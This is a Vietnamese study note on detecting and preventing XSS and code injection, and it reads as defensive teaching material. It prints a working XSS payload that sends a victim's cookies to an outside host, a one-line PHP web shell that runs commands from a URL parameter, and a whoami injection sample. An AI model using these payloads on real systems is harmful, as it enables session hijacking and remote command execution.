- **XSS** là một kỹ thuật tấn công trong đó kẻ tấn công chèn mã độc hại (thường là JavaScript) vào một trang web thông qua các đầu vào của người dùng (ví dụ: bình luận, biểu mẫu).
- Khi người dùng khác truy cập trang web này, trình duyệt của họ sẽ thực thi mã độc hại, cho phép kẻ tấn công:
    - Đánh cắp cookie, token, hoặc thông tin phiên (session).
    - Thực hiện các hành động thay mặt người dùng.
    - Chuyển hướng người dùng đến các trang web độc hại.

---

### **Cách phát hiện tấn công XSS**

1. **Phân tích các yêu cầu HTTP**:
    
    - Nếu chúng ta nhận thấy một lượng lớn yêu cầu HTTP được gửi đến một máy chủ nội bộ không xác định, đây có thể là dấu hiệu của XSS.
    - Example: Các yêu cầu chứa dữ liệu như cookie hoặc token được mã hóa hoặc không rõ ràng.
    
    ![[image 18.png|image 18.png](../../Image/image%2018.png)
    
2. **Kiểm tra mã độc hại**:
    - Kẻ tấn công có thể chèn mã JavaScript vào các phần của trang web.
        
        ```JavaScript
        <script>
          window.addEventListener("load", function() {
            const url = "http://192.168.0.19:5555";
            const params = "cookie=" + encodeURIComponent(document.cookie);
            const request = new XMLHttpRequest();
            request.open("GET", url + "?" + params);
            request.send();
          });
        </script>
        ```
        
	-  Mã này sẽ gửi cookie của người dùng đến một máy chủ do kẻ tấn công kiểm soát.
3. **Phát hiện mã độc hại trong đầu vào người dùng**:
    - Kẻ tấn công có thể chèn mã PHP hoặc các lệnh hệ thống để thực thi các hành động độc hại.
        
        ```Plain
        <?php system($_GET['cmd']); ?>
        ```
        
        - Mã này cho phép kẻ tấn công thực thi các lệnh hệ thống thông qua tham số `cmd`.
        
        ```Plain
        <?php echo `whoami`; ?>
        ```
        
        - Mã này sẽ trả về tên người dùng hiện tại trên máy chủ.

---

### **Cách phòng chống tấn công XSS và Code Injection**

1. **Sanitize User Input**:
    - Luôn kiểm tra và làm sạch dữ liệu đầu vào từ người dùng để đảm bảo chúng không chứa mã độc hại.
    - Ví dụ: Loại bỏ hoặc mã hóa các ký tự đặc biệt như `<`, `>`, `&`, `"`, `'`.
2. **Không diễn giải đầu vào người dùng như mã**:
    - Không bao giờ xử lý đầu vào người dùng như mã thực thi (ví dụ: JavaScript, PHP).